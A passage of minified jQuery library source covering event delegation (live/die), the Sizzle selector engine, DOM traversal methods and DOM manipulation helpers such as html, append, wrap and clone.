b[e].apply(this,arguments)||!1};e.guid=c;while(d<b.length)b[d++].guid=c;return this.click(e)},hover:function(a,b){return this.mouseenter(a).mouseleave(b||a)}});var M={focus:"focusin",blur:"focusout",mouseenter:"mouseover",mouseleave:"mouseout"};f.each(["live","die"],function(a,c){f.fn[c]=function(a,d,e,g){var h,i=0,j,k,l,m=g||this.selector,n=g?this:f(this.context);if(typeof a=="object"&&!a.preventDefault){for(var o in a)n[c](o,d,a[o],m);return this}if(c==="die"&&!a&&g&&g.charAt(0)==="."){n.unbind(g);return this}if(d===!1||f.isFunction(d))e=d||E,d=b;a=(a||"").split(" ");while((h=a[i++])!=null){j=y.exec(h),k="",j&&(k=j[0],h=h.replace(y,""));if(h==="hover"){a.push("mouseenter"+k,"mouseleave"+k);continue}l=h,M[h]?(a.push(M[h]+k),h=h+k):h=(M[h]||h)+k;if(c==="live")for(var p=0,q=n.length;p<q;p++)f.event.add(n[p],"live."+O(h,m),{data:d,selector:m,handler:e,origType:h,origHandler:e,preType:l});else n.unbind("live."+O(h,m),e)}return this}}),f.each("blur focus focusin focusout load resize scroll unload click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup error".split(" "),function(a,b){f.fn[b]=function(a,c){c==null&&(c=a,a=null);return arguments.length>0?this.bind(b,a,c):this.trigger(b)},f.attrFn&&(f.attrFn[b]=!0)}),function(){function u(a,b,c,d,e,f){for(var g=0,h=d.length;g<h;g++){var i=d[g];if(i){var j=!1;i=i[a];while(i){if(i.sizcache===c){j=d[i.sizset];break}if(i.nodeType===1){f||(i.sizcache=c,i.sizset=g);if(typeof b!="string"){if(i===b){j=!0;break}}else if(k.filter(b,[i]).length>0){j=i;break}}i=i[a]}d[g]=j}}}function t(a,b,c,d,e,f){for(var g=0,h=d.length;g<h;g++){var i=d[g];if(i){var j=!1;i=i[a];while(i){if(i.sizcache===c){j=d[i.sizset];break}i.nodeType===1&&!f&&(i.sizcache=c,i.sizset=g);if(i.nodeName.toLowerCase()===b){j=i;break}i=i[a]}d[g]=j}}}var a=/((?:\((?:\([^()]+\)|[^()]+)+\)|\[(?:\[[^\[\]]*\]|['"][^'"]*['"]|[^\[\]'"]+)+\]|\\.|[^ >+~,(\[\\]+)+|[>+~])(\s*,\s*)?((?:.|\r|\n)*)/g,d=0,e=Object.prototype.toString,g=!1,h=!0,i=/\\/g,j=/\W/;[0,0].sort(function(){h=!1;return 0});var k=function(b,d,f,g){f=f||[],d=d||c;var h=d;if(d.nodeType!==1&&d.nodeType!==9)return[];if(!b||typeof b!="string")return f;var i,j,n,o,q,r,s,t,u=!0,w=k.isXML(d),x=[],y=b;do{a.exec(""),i=a.exec(y);if(i){y=i[3],x.push(i[1]);if(i[2]){o=i[3];break}}}while(i);if(x.length>1&&m.exec(b))if(x.length===2&&l.relative[x[0]])j=v(x[0]+x[1],d);else{j=l.relative[x[0]]?[d]:k(x.shift(),d);while(x.length)b=x.shift(),l.relative[b]&&(b+=x.shift()),j=v(b,j)}else{!g&&x.length>1&&d.nodeType===9&&!w&&l.match.ID.test(x[0])&&!l.match.ID.test(x[x.length-1])&&(q=k.find(x.shift(),d,w),d=q.expr?k.filter(q.expr,q.set)[0]:q.set[0]);if(d){q=g?{expr:x.pop(),set:p(g)}:k.find(x.pop(),x.length===1&&(x[0]==="~"||x[0]==="+")&&d.parentNode?d.parentNode:d,w),j=q.expr?k.filter(q.expr,q.set):q.set,x.length>0?n=p(j):u=!1;while(x.length)r=x.pop(),s=r,l.relative[r]?s=x.pop():r="",s==null&&(s=d),l.relative[r](n,s,w)}else n=x=[]}n||(n=j),n||k.error(r||b);if(e.call(n)==="[object Array]")if(!u)f.push.apply(f,n);else if(d&&d.nodeType===1)for(t=0;n[t]!=null;t++)n[t]&&(n[t]===!0||n[t].nodeType===1&&k.contains(d,n[t]))&&f.push(j[t]);else for(t=0;n[t]!=null;t++)n[t]&&n[t].nodeType===1&&f.push(j[t]);else p(n,f);o&&(k(o,h,f,g),k.uniqueSort(f));return f};k.uniqueSort=function(a){if(r){g=h,a.sort(r);if(g)for(var b=1;b<a.length;b++)a[b]===a[b-1]&&a.splice(b--,1)}return a},k.matches=function(a,b){return k(a,null,null,b)},k.matchesSelector=function(a,b){return k(b,null,null,[a]).length>0},k.find=function(a,b,c){var d;if(!a)return[];for(var e=0,f=l.order.length;e<f;e++){var g,h=l.order[e];if(g=l.leftMatch[h].exec(a)){var j=g[1];g.splice(1,1);if(j.substr(j.length-1)!=="\\"){g[1]=(g[1]||"").replace(i,""),d=l.find[h](g,b,c);if(d!=null){a=a.replace(l.match[h],"");break}}}}d||(d=typeof b.getElementsByTagName!="undefined"?b.getElementsByTagName("*"):[]);return{set:d,expr:a}},k.filter=function(a,c,d,e){var f,g,h=a,i=[],j=c,m=c&&c[0]&&k.isXML(c[0]);while(a&&c.length){for(var n in l.filter)if((f=l.leftMatch[n].exec(a))!=null&&f[2]){var o,p,q=l.filter[n],r=f[1];g=!1,f.splice(1,1);if(r.substr(r.length-1)==="\\")continue;j===i&&(i=[]);if(l.preFilter[n]){f=l.preFilter[n](f,j,d,i,e,m);if(!f)g=o=!0;else if(f===!0)continue}if(f)for(var s=0;(p=j[s])!=null;s++)if(p){o=q(p,f,s,j);var t=e^!!o;d&&o!=null?t?g=!0:j[s]=!1:t&&(i.push(p),g=!0)}if(o!==b){d||(j=i),a=a.replace(l.match[n],"");if(!g)return[];break}}if(a===h)if(g==null)k.error(a);else break;h=a}return j},k.error=function(a){throw"Syntax error, unrecognized expression: "+a};var l=k.selectors={order:["ID","NAME","TAG"],match:{ID:/#((?:[\w\u00c0-\uFFFF\-]|\\.)+)/,CLASS:/\.((?:[\w\u00c0-\uFFFF\-]|\\.)+)/,NAME:/\[name=['"]*((?:[\w\u00c0-\uFFFF\-]|\\.)+)['"]*\]/,ATTR:/\[\s*((?:[\w\u00c0-\uFFFF\-]|\\.)+)\s*(?:(\S?=)\s*(?:(['"])(.*?)\3|(#?(?:[\w\u00c0-\uFFFF\-]|\\.)*)|)|)\s*\]/,TAG:/^((?:[\w\u00c0-\uFFFF\*\-]|\\.)+)/,CHILD:/:(only|nth|last|first)-child(?:\(\s*(even|odd|(?:[+\-]?\d+|(?:[+\-]?\d*)?n\s*(?:[+\-]\s*\d+)?))\s*\))?/,POS:/:(nth|eq|gt|lt|first|last|even|odd)(?:\((\d*)\))?(?=[^\-]|$)/,PSEUDO:/:((?:[\w\u00c0-\uFFFF\-]|\\.)+)(?:\((['"]?)((?:\([^\)]+\)|[^\(\)]*)+)\2\))?/},leftMatch:{},attrMap:{"class":"className","for":"htmlFor"},attrHandle:{href:function(a){return a.getAttribute("href")},type:function(a){return a.getAttribute("type")}},relative:{"+":function(a,b){var c=typeof b=="string",d=c&&!j.test(b),e=c&&!d;d&&(b=b.toLowerCase());for(var f=0,g=a.length,h;f<g;f++)if(h=a[f]){while((h=h.previousSibling)&&h.nodeType!==1);a[f]=e||h&&h.nodeName.toLowerCase()===b?h||!1:h===b}e&&k.filter(b,a,!0)},">":function(a,b){var c,d=typeof b=="string",e=0,f=a.length;if(d&&!j.test(b)){b=b.toLowerCase();for(;e<f;e++){c=a[e];if(c){var g=c.parentNode;a[e]=g.nodeName.toLowerCase()===b?g:!1}}}else{for(;e<f;e++)c=a[e],c&&(a[e]=d?c.parentNode:c.parentNode===b);d&&k.filter(b,a,!0)}},"":function(a,b,c){var e,f=d++,g=u;typeof b=="string"&&!j.test(b)&&(b=b.toLowerCase(),e=b,g=t),g("parentNode",b,f,a,e,c)},"~":function(a,b,c){var e,f=d++,g=u;typeof b=="string"&&!j.test(b)&&(b=b.toLowerCase(),e=b,g=t),g("previousSibling",b,f,a,e,c)}},find:{ID:function(a,b,c){if(typeof b.getElementById!="undefined"&&!c){var d=b.getElementById(a[1]);return d&&d.parentNode?[d]:[]}},NAME:function(a,b){if(typeof b.getElementsByName!="undefined"){var c=[],d=b.getElementsByName(a[1]);for(var e=0,f=d.length;e<f;e++)d[e].getAttribute("name")===a[1]&&c.push(d[e]);return c.length===0?null:c}},TAG:function(a,b){if(typeof b.getElementsByTagName!="undefined")return b.getElementsByTagName(a[1])}},preFilter:{CLASS:function(a,b,c,d,e,f){a=" "+a[1].replace(i,"")+" ";if(f)return a;for(var g=0,h;(h=b[g])!=null;g++)h&&(e^(h.className&&(" "+h.className+" ").replace(/[\t\n\r]/g," ").indexOf(a)>=0)?c||d.push(h):c&&(b[g]=!1));return!1},ID:function(a){return a[1].replace(i,"")},TAG:function(a,b){return a[1].replace(i,"").toLowerCase()},CHILD:function(a){if(a[1]==="nth"){a[2]||k.error(a[0]),a[2]=a[2].replace(/^\+|\s*/g,"");var b=/(-?)(\d*)(?:n([+\-]?\d*))?/.exec(a[2]==="even"&&"2n"||a[2]==="odd"&&"2n+1"||!/\D/.test(a[2])&&"0n+"+a[2]||a[2]);a[2]=b[1]+(b[2]||1)-0,a[3]=b[3]-0}else a[2]&&k.error(a[0]);a[0]=d++;return a},ATTR:function(a,b,c,d,e,f){var g=a[1]=a[1].replace(i,"");!f&&l.attrMap[g]&&(a[1]=l.attrMap[g]),a[4]=(a[4]||a[5]||"").replace(i,""),a[2]==="~="&&(a[4]=" "+a[4]+" ");return a},PSEUDO:function(b,c,d,e,f){if(b[1]==="not")if((a.exec(b[3])||"").length>1||/^\w/.test(b[3]))b[3]=k(b[3],null,null,c);else{var g=k.filter(b[3],c,d,!0^f);d||e.push.apply(e,g);return!1}else if(l.match.POS.test(b[0])||l.match.CHILD.test(b[0]))return!0;return b},POS:function(a){a.unshift(!0);return a}},filters:{enabled:function(a){return a.disabled===!1&&a.type!=="hidden"},disabled:function(a){return a.disabled===!0},checked:function(a){return a.checked===!0},selected:function(a){a.parentNode&&a.parentNode.selectedIndex;return a.selected===!0},parent:function(a){return!!a.firstChild},empty:function(a){return!a.firstChild},has:function(a,b,c){return!!k(c[3],a).length},header:function(a){return/h\d/i.test(a.nodeName)},text:function(a){var b=a.getAttribute("type"),c=a.type;return a.nodeName.toLowerCase()==="input"&&"text"===c&&(b===c||b===null)},radio:function(a){return a.nodeName.toLowerCase()==="input"&&"radio"===a.type},checkbox:function(a){return a.nodeName.toLowerCase()==="input"&&"checkbox"===a.type},file:function(a){return a.nodeName.toLowerCase()==="input"&&"file"===a.type},password:function(a){return a.nodeName.toLowerCase()==="input"&&"password"===a.type},submit:function(a){var b=a.nodeName.toLowerCase();return(b==="input"||b==="button")&&"submit"===a.type},image:function(a){return a.nodeName.toLowerCase()==="input"&&"image"===a.type},reset:function(a){var b=a.nodeName.toLowerCase();return(b==="input"||b==="button")&&"reset"===a.type},button:function(a){var b=a.nodeName.toLowerCase();return b==="input"&&"button"===a.type||b==="button"},input:function(a){return/input|select|textarea|button/i.test(a.nodeName)},focus:function(a){return a===a.ownerDocument.activeElement}},setFilters:{first:function(a,b){return b===0},last:function(a,b,c,d){return b===d.length-1},even:function(a,b){return b%2===0},odd:function(a,b){return b%2===1},lt:function(a,b,c){return b<c[3]-0},gt:function(a,b,c){return b>c[3]-0},nth:function(a,b,c){return c[3]-0===b},eq:function(a,b,c){return c[3]-0===b}},filter:{PSEUDO:function(a,b,c,d){var e=b[1],f=l.filters[e];if(f)return f(a,c,b,d);if(e==="contains")return(a.textContent||a.innerText||k.getText([a])||"").indexOf(b[3])>=0;if(e==="not"){var g=b[3];for(var h=0,i=g.length;h<i;h++)if(g[h]===a)return!1;return!0}k.error(e)},CHILD:function(a,b){var c=b[1],d=a;switch(c){case"only":case"first":while(d=d.previousSibling)if(d.nodeType===1)return!1;if(c==="first")return!0;d=a;case"last":while(d=d.nextSibling)if(d.nodeType===1)return!1;return!0;case"nth":var e=b[2],f=b[3];if(e===1&&f===0)return!0;var g=b[0],h=a.parentNode;if(h&&(h.sizcache!==g||!a.nodeIndex)){var i=0;for(d=h.firstChild;d;d=d.nextSibling)d.nodeType===1&&(d.nodeIndex=++i);h.sizcache=g}var j=a.nodeIndex-f;return e===0?j===0:j%e===0&&j/e>=0}},ID:function(a,b){return a.nodeType===1&&a.getAttribute("id")===b},TAG:function(a,b){return b==="*"&&a.nodeType===1||a.nodeName.toLowerCase()===b},CLASS:function(a,b){return(" "+(a.className||a.getAttribute("class"))+" ").indexOf(b)>-1},ATTR:function(a,b){var c=b[1],d=l.attrHandle[c]?l.attrHandle[c](a):a[c]!=null?a[c]:a.getAttribute(c),e=d+"",f=b[2],g=b[4];return d==null?f==="!=":f==="="?e===g:f==="*="?e.indexOf(g)>=0:f==="~="?(" "+e+" ").indexOf(g)>=0:g?f==="!="?e!==g:f==="^="?e.indexOf(g)===0:f==="$="?e.substr(e.length-g.length)===g:f==="|="?e===g||e.substr(0,g.length+1)===g+"-":!1:e&&d!==!1},POS:function(a,b,c,d){var e=b[2],f=l.setFilters[e];if(f)return f(a,c,b,d)}}},m=l.match.POS,n=function(a,b){return"\\"+(b-0+1)};for(var o in l.match)l.match[o]=new RegExp(l.match[o].source+/(?![^\[]*\])(?![^\(]*\))/.source),l.leftMatch[o]=new RegExp(/(^(?:.|\r|\n)*?)/.source+l.match[o].source.replace(/\\(\d+)/g,n));var p=function(a,b){a=Array.prototype.slice.call(a,0);if(b){b.push.apply(b,a);return b}return a};try{Array.prototype.slice.call(c.documentElement.childNodes,0)[0].nodeType}catch(q){p=function(a,b){var c=0,d=b||[];if(e.call(a)==="[object Array]")Array.prototype.push.apply(d,a);else if(typeof a.length=="number")for(var f=a.length;c<f;c++)d.push(a[c]);else for(;a[c];c++)d.push(a[c]);return d}}var r,s;c.documentElement.compareDocumentPosition?r=function(a,b){if(a===b){g=!0;return 0}if(!a.compareDocumentPosition||!b.compareDocumentPosition)return a.compareDocumentPosition?-1:1;return a.compareDocumentPosition(b)&4?-1:1}:(r=function(a,b){if(a===b){g=!0;return 0}if(a.sourceIndex&&b.sourceIndex)return a.sourceIndex-b.sourceIndex;var c,d,e=[],f=[],h=a.parentNode,i=b.parentNode,j=h;if(h===i)return s(a,b);if(!h)return-1;if(!i)return 1;while(j)e.unshift(j),j=j.parentNode;j=i;while(j)f.unshift(j),j=j.parentNode;c=e.length,d=f.length;for(var k=0;k<c&&k<d;k++)if(e[k]!==f[k])return s(e[k],f[k]);return k===c?s(a,f[k],-1):s(e[k],b,1)},s=function(a,b,c){if(a===b)return c;var d=a.nextSibling;while(d){if(d===b)return-1;d=d.nextSibling}return 1}),k.getText=function(a){var b="",c;for(var d=0;a[d];d++)c=a[d],c.nodeType===3||c.nodeType===4?b+=c.nodeValue:c.nodeType!==8&&(b+=k.getText(c.childNodes));return b},function(){var a=c.createElement("div"),d="script"+(new Date).getTime(),e=c.documentElement;a.innerHTML="<a name='"+d+"'/>",e.insertBefore(a,e.firstChild),c.getElementById(d)&&(l.find.ID=function(a,c,d){if(typeof c.getElementById!="undefined"&&!d){var e=c.getElementById(a[1]);return e?e.id===a[1]||typeof e.getAttributeNode!="undefined"&&e.getAttributeNode("id").nodeValue===a[1]?[e]:b:[]}},l.filter.ID=function(a,b){var c=typeof a.getAttributeNode!="undefined"&&a.getAttributeNode("id");return a.nodeType===1&&c&&c.nodeValue===b}),e.removeChild(a),e=a=null}(),function(){var a=c.createElement("div");a.appendChild(c.createComment("")),a.getElementsByTagName("*").length>0&&(l.find.TAG=function(a,b){var c=b.getElementsByTagName(a[1]);if(a[1]==="*"){var d=[];for(var e=0;c[e];e++)c[e].nodeType===1&&d.push(c[e]);c=d}return c}),a.innerHTML="<a href='#'></a>",a.firstChild&&typeof a.firstChild.getAttribute!="undefined"&&a.firstChild.getAttribute("href")!=="#"&&(l.attrHandle.href=function(a){return a.getAttribute("href",2)}),a=null}(),c.querySelectorAll&&function(){var a=k,b=c.createElement("div"),d="__sizzle__";b.innerHTML="<p class='TEST'></p>";if(!b.querySelectorAll||b.querySelectorAll(".TEST").length!==0){k=function(b,e,f,g){e=e||c;if(!g&&!k.isXML(e)){var h=/^(\w+$)|^\.([\w\-]+$)|^#([\w\-]+$)/.exec(b);if(h&&(e.nodeType===1||e.nodeType===9)){if(h[1])return p(e.getElementsByTagName(b),f);if(h[2]&&l.find.CLASS&&e.getElementsByClassName)return p(e.getElementsByClassName(h[2]),f)}if(e.nodeType===9){if(b==="body"&&e.body)return p([e.body],f);if(h&&h[3]){var i=e.getElementById(h[3]);if(!i||!i.parentNode)return p([],f);if(i.id===h[3])return p([i],f)}try{return p(e.querySelectorAll(b),f)}catch(j){}}else if(e.nodeType===1&&e.nodeName.toLowerCase()!=="object"){var m=e,n=e.getAttribute("id"),o=n||d,q=e.parentNode,r=/^\s*[+~]/.test(b);n?o=o.replace(/'/g,"\\$&"):e.setAttribute("id",o),r&&q&&(e=e.parentNode);try{if(!r||q)return p(e.querySelectorAll("[id='"+o+"'] "+b),f)}catch(s){}finally{n||m.removeAttribute("id")}}}return a(b,e,f,g)};for(var e in a)k[e]=a[e];b=null}}(),function(){var a=c.documentElement,b=a.matchesSelector||a.mozMatchesSelector||a.webkitMatchesSelector||a.msMatchesSelector;if(b){var d=!b.call(c.createElement("div"),"div"),e=!1;try{b.call(c.documentElement,"[test!='']:sizzle")}catch(f){e=!0}k.matchesSelector=function(a,c){c=c.replace(/\=\s*([^'"\]]*)\s*\]/g,"='$1']");if(!k.isXML(a))try{if(e||!l.match.PSEUDO.test(c)&&!/!=/.test(c)){var f=b.call(a,c);if(f||!d||a.document&&a.document.nodeType!==11)return f}}catch(g){}return k(c,null,null,[a]).length>0}}}(),function(){var a=c.createElement("div");a.innerHTML="<div class='test e'></div><div class='test'></div>";if(!!a.getElementsByClassName&&a.getElementsByClassName("e").length!==0){a.lastChild.className="e";if(a.getElementsByClassName("e").length===1)return;l.order.splice(1,0,"CLASS"),l.find.CLASS=function(a,b,c){if(typeof b.getElementsByClassName!="undefined"&&!c)return b.getElementsByClassName(a[1])},a=null}}(),c.documentElement.contains?k.contains=function(a,b){return a!==b&&(a.contains?a.contains(b):!0)}:c.documentElement.compareDocumentPosition?k.contains=function(a,b){return!!(a.compareDocumentPosition(b)&16)}:k.contains=function(){return!1},k.isXML=function(a){var b=(a?a.ownerDocument||a:0).documentElement;return b?b.nodeName!=="HTML":!1};var v=function(a,b){var c,d=[],e="",f=b.nodeType?[b]:b;while(c=l.match.PSEUDO.exec(a))e+=c[0],a=a.replace(l.match.PSEUDO,"");a=l.relative[a]?a+"*":a;for(var g=0,h=f.length;g<h;g++)k(a,f[g],d);return k.filter(e,d)};f.find=k,f.expr=k.selectors,f.expr[":"]=f.expr.filters,f.unique=k.uniqueSort,f.text=k.getText,f.isXMLDoc=k.isXML,f.contains=k.contains}();var P=/Until$/,Q=/^(?:parents|prevUntil|prevAll)/,R=/,/,S=/^.[^:#\[\.,]*$/,T=Array.prototype.slice,U=f.expr.match.POS,V={children:!0,contents:!0,next:!0,prev:!0};f.fn.extend({find:function(a){var b=this,c,d;if(typeof a!="string")return f(a).filter(function(){for(c=0,d=b.length;c<d;c++)if(f.contains(b[c],this))return!0});var e=this.pushStack("","find",a),g,h,i;for(c=0,d=this.length;c<d;c++){g=e.length,f.find(a,this[c],e);if(c>0)for(h=g;h<e.length;h++)for(i=0;i<g;i++)if(e[i]===e[h]){e.splice(h--,1);break}}return e},has:function(a){var b=f(a);return this.filter(function(){for(var a=0,c=b.length;a<c;a++)if(f.contains(this,b[a]))return!0})},not:function(a){return this.pushStack(X(this,a,!1),"not",a)},filter:function(a){return this.pushStack(X(this,a,!0),"filter",a)},is:function(a){return!!a&&(typeof a=="string"?f.filter(a,this).length>0:this.filter(a).length>0)},closest:function(a,b){var c=[],d,e,g=this[0];if(f.isArray(a)){var h,i,j={},k=1;if(g&&a.length){for(d=0,e=a.length;d<e;d++)i=a[d],j[i]||(j[i]=U.test(i)?f(i,b||this.context):i);while(g&&g.ownerDocument&&g!==b){for(i in j)h=j[i],(h.jquery?h.index(g)>-1:f(g).is(h))&&c.push({selector:i,elem:g,level:k});g=g.parentNode,k++}}return c}var l=U.test(a)||typeof a!="string"?f(a,b||this.context):0;for(d=0,e=this.length;d<e;d++){g=this[d];while(g){if(l?l.index(g)>-1:f.find.matchesSelector(g,a)){c.push(g);break}g=g.parentNode;if(!g||!g.ownerDocument||g===b||g.nodeType===11)break}}c=c.length>1?f.unique(c):c;return this.pushStack(c,"closest",a)},index:function(a){if(!a||typeof a=="string")return f.inArray(this[0],a?f(a):this.parent().children());return f.inArray(a.jquery?a[0]:a,this)},add:function(a,b){var c=typeof a=="string"?f(a,b):f.makeArray(a&&a.nodeType?[a]:a),d=f.merge(this.get(),c);return this.pushStack(W(c[0])||W(d[0])?d:f.unique(d))},andSelf:function(){return this.add(this.prevObject)}}),f.each({parent:function(a){var b=a.parentNode;return b&&b.nodeType!==11?b:null},parents:function(a){return f.dir(a,"parentNode")},parentsUntil:function(a,b,c){return f.dir(a,"parentNode",c)},next:function(a){return f.nth(a,2,"nextSibling")},prev:function(a){return f.nth(a,2,"previousSibling")},nextAll:function(a){return f.dir(a,"nextSibling")},prevAll:function(a){return f.dir(a,"previousSibling")},nextUntil:function(a,b,c){return f.dir(a,"nextSibling",c)},prevUntil:function(a,b,c){return f.dir(a,"previousSibling",c)},siblings:function(a){return f.sibling(a.parentNode.firstChild,a)},children:function(a){return f.sibling(a.firstChild)},contents:function(a){return f.nodeName(a,"iframe")?a.contentDocument||a.contentWindow.document:f.makeArray(a.childNodes)}},function(a,b){f.fn[a]=function(c,d){var e=f.map(this,b,c),g=T.call(arguments);P.test(a)||(d=c),d&&typeof d=="string"&&(e=f.filter(d,e)),e=this.length>1&&!V[a]?f.unique(e):e,(this.length>1||R.test(d))&&Q.test(a)&&(e=e.reverse());return this.pushStack(e,a,g.join(","))}}),f.extend({filter:function(a,b,c){c&&(a=":not("+a+")");return b.length===1?f.find.matchesSelector(b[0],a)?[b[0]]:[]:f.find.matches(a,b)},dir:function(a,c,d){var e=[],g=a[c];while(g&&g.nodeType!==9&&(d===b||g.nodeType!==1||!f(g).is(d)))g.nodeType===1&&e.push(g),g=g[c];return e},nth:function(a,b,c,d){b=b||1;var e=0;for(;a;a=a[c])if(a.nodeType===1&&++e===b)break;return a},sibling:function(a,b){var c=[];for(;a;a=a.nextSibling)a.nodeType===1&&a!==b&&c.push(a);return c}});var Y=/ jQuery\d+="(?:\d+|null)"/g,Z=/^\s+/,$=/<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:]+)[^>]*)\/>/ig,_=/<([\w:]+)/,ba=/<tbody/i,bb=/<|&#?\w+;/,bc=/<(?:script|object|embed|option|style)/i,bd=/checked\s*(?:[^=]|=\s*.checked.)/i,be=/\/(java|ecma)script/i,bf=/^\s*<!(?:\[CDATA\[|\-\-)/,bg={option:[1,"<select multiple='multiple'>","</select>"],legend:[1,"<fieldset>","</fieldset>"],thead:[1,"<table>","</table>"],tr:[2,"<table><tbody>","</tbody></table>"],td:[3,"<table><tbody><tr>","</tr></tbody></table>"],col:[2,"<table><tbody></tbody><colgroup>","</colgroup></table>"],area:[1,"<map>","</map>"],_default:[0,"",""]};bg.optgroup=bg.option,bg.tbody=bg.tfoot=bg.colgroup=bg.caption=bg.thead,bg.th=bg.td,f.support.htmlSerialize||(bg._default=[1,"div<div>","</div>"]),f.fn.extend({text:function(a){if(f.isFunction(a))return this.each(function(b){var c=f(this);c.text(a.call(this,b,c.text()))});if(typeof a!="object"&&a!==b)return this.empty().append((this[0]&&this[0].ownerDocument||c).createTextNode(a));return f.text(this)},wrapAll:function(a){if(f.isFunction(a))return this.each(function(b){f(this).wrapAll(a.call(this,b))});if(this[0]){var b=f(a,this[0].ownerDocument).eq(0).clone(!0);this[0].parentNode&&b.insertBefore(this[0]),b.map(function(){var a=this;while(a.firstChild&&a.firstChild.nodeType===1)a=a.firstChild;return a}).append(this)}return this},wrapInner:function(a){if(f.isFunction(a))return this.each(function(b){f(this).wrapInner(a.call(this,b))});return this.each(function(){var b=f(this),c=b.contents();c.length?c.wrapAll(a):b.append(a)})},wrap:function(a){return this.each(function(){f(this).wrapAll(a)})},unwrap:function(){return this.parent().each(function(){f.nodeName(this,"body")||f(this).replaceWith(this.childNodes)}).end()},append:function(){return this.domManip(arguments,!0,function(a){this.nodeType===1&&this.appendChild(a)})},prepend:function(){return this.domManip(arguments,!0,function(a){this.nodeType===1&&this.insertBefore(a,this.firstChild)})},before:function(){if(this[0]&&this[0].parentNode)return this.domManip(arguments,!1,function(a){this.parentNode.insertBefore(a,this)});if(arguments.length){var a=f(arguments[0]);a.push.apply(a,this.toArray());return this.pushStack(a,"before",arguments)}},after:function(){if(this[0]&&this[0].parentNode)return this.domManip(arguments,!1,function(a){this.parentNode.insertBefore(a,this.nextSibling)});if(arguments.length){var a=this.pushStack(this,"after",arguments);a.push.apply(a,f(arguments[0]).toArray());return a}},remove:function(a,b){for(var c=0,d;(d=this[c])!=null;c++)if(!a||f.filter(a,[d]).length)!b&&d.nodeType===1&&(f.cleanData(d.getElementsByTagName("*")),f.cleanData([d])),d.parentNode&&d.parentNode.removeChild(d);return this},empty:function(){for(var a=0,b;(b=this[a])!=null;a++){b.nodeType===1&&f.cleanData(b.getElementsByTagName("*"));while(b.firstChild)b.removeChild(b.firstChild)}return this},clone:function(a,b){a=a==null?!1:a,b=b==null?a:b;return this.map(function(){return f.clone(this,a,b)})},html:function(a){if(a===b)return this[0]&&this[0].nodeType===1?this[0].innerHTML.replace(Y,""):null;if(typeof a=="string"&&!bc.test(a)&&(f.support.leadingWhitespace||!Z.test(a))&&!bg[(_.exec(a)||["",""])[1].toLowerCase()]){a=a.replace($,"<$1></$2>");try{for(var c=0,d=this.length;c<d;c++)this[c].nodeType===1&&(f.cleanData(this[c].getElementsByTagName("*")),this[c].innerHTML=a)}catch(e){this.empty().append(a)}}else f.isFunction(a)?this.each(function(b){var c=f(this);c.html(a.call(this,b,c.html()))}):this.empty().append(a);return this},replaceWith:function(a){if(this[0]&&this[0].parentNode){if(f.isFunction(a))return this.each(function(b){var c=f(this),d=c.html();c.replaceWith(a.call(this,b,d))});typeof a!="string"&&(a=f(a).detach());return this.each(function(){var b=this.nextSibling,c=this.parentNode;f(this).remove(),b?f(b).before(a):f(c).append(a)})}return this.length?this.pushStack(f(f.isFunction(a)?a():a),"replaceWith",a):this},detach:function(a){return this.remove(a,!0)},domManip:function(a,c,d){var e,g,h,i,j=a[0],k=[];if(!f.support.checkClone&&arguments.length===3&&typeof j=="string"&&bd.test(j))return this.each(function(){f(this).domManip(a,c,d,!0)});if(f.isFunction(j))return this.each(function(e){var g=f(this);a[0]=j.call(this,e,c?g.html():b),g.domManip(a,c,d)});if(this[0]){i=j&&j.parentNode,f.support.parentNode&&i&&i.nodeType===11&&i.childNodes.length===this.length?e={fragment:i}:e=f.buildFragment(a,this,k),h=e.fragment,h.childNodes.length===1?g=h=h.firstChild:g=h.firstChild;if(g){c=c&&f.nodeName(g,"tr");for(var l=0,m=this.length,n=m-1;l<m;l++)d.call(c?bh(this[l],g):this[l],e.cacheable||m>1&&l<n?f.clone(h,!0,!0):h)}k.length&&f.each(k,bn)}return this}}),f.buildFragment=function(a,b,d){var e,g,h,i=b&&b[0]?b[0].ownerDocument||b[0]:c;a.length===1&&typeof a[0]=="string"&&a[0].length<512&&i===c&&a[0].charAt(0)==="<"&&!bc.test(a[0])&&(f.support.checkClone||!bd.test(a[0]))&&(g=!0,h=f.fragments[a[0]],h&&h!==1&&(e=h)),e||(e=i.createDocumentFragment(),f.clean(a,i,e,d)),g&&(f.fragments[a[0]]=h?e:1);return{fragment:e,cacheable:g}},f.fragments={},f.each({appendTo:"append",prependTo:"prepend",insertBefore:"before",insertAfter:"after",replaceAll:"replaceWith"},function(a,b){f.fn[a]=function(c){var d=[],e=f(c),g=this.length===1&&this[0].parentNode;if(g&&g.nodeType===11&&g.childNodes.length===1&&e.length===1){e[b](this[0]);return this}for(var h=0,i=e.length;h<i;h++){var j=(h>0?this.clone(!0):this).get();f(e[h])[b](j),d=d.concat(j)}return this.pushStack(d,a,e.selector)}}),f.extend({clone:function(a,b,c){var d=a.cloneNode(!0),e,g,h;if((!f.support.noCloneEvent||!f.support.noCloneChecked)&&(a.nodeType===1||a.nodeType===11)&&!f.isXMLDoc(a)){bj(a,d),e=bk(a),g=bk(d);for(h=0;e[h];++h)bj(e[h],g[h])}if(b){bi(a,d);if(c){e=bk(a),g=bk(d);for(h=0;e[h];++h)bi(e[h],g[h])}}return d},clean:function(a,b,d,e){var g;b=b||c,typeof b.createElement=="undefined"&&(b=b.ownerDocument||
b[0]&&b[0].ownerDocument||c);var h=[],i;for(var j=0,k;(k=a[j])!=null;j++){typeof k=="number"&&(k+="");if(!k)continue;if(typeof k=="string")if(!bb.test(k))k=b.createTextNode(k);else{k=k.replace($,"<$1></$2>");var l=(_.exec(k)||["",""])[1].toLowerCase(),m=bg[l]||bg._default,n=m[0],o=b.createElement("div");o.innerHTML=m[1]+k+m[2];while(n--)o=o.lastChild;if(!f.support.tbody){var p=ba.test(k),q=l==="table"&&!p?o.firstChild&&o.firstChild.childNodes:m[1]==="<table>"&&!p?o.childNodes:[];for(i=q.length-1;i>=0;--i)f.nodeName(q[i],"tbody")&&!q[i].childNodes.length&&q[i].parentNode.removeChild(q[i])}!f.support.leadingWhitespace&&Z.test(k)&&o.insertBefore(b.createTextNode(Z.exec(k)[0]),o.firstChild),k=o.childNodes}var r;if(!f.support.appendChecked)if(k[0]&&typeof (r=k.length)=="number")for(i=0;i<r;i++)bm(k[i]);else 